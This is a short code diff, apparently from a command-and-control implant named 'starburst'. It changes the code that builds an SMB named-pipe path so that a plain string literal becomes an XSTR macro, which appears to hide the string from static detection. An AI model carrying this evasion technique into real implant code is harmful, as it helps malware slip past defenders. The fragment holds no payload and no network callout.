@@ -70,7 +70,7 @@ auto declfn starburst::smb_pipe_create(
 
     // build full pipe path: \\.\pipe\<pipename>
     char pipe_path[300] = {};
-    str_copy( pipe_path, symbol<char*>( const_cast<char*>( "\\\\.\\pipe\\" ) ) );
+    str_copy( pipe_path, XSTR( "\\\\.\\pipe\\" ) );
     str_concat( pipe_path, inst.transport.pipename );
 
     inst.h_pipe = inst.kernel32.CreateNamedPipeA(
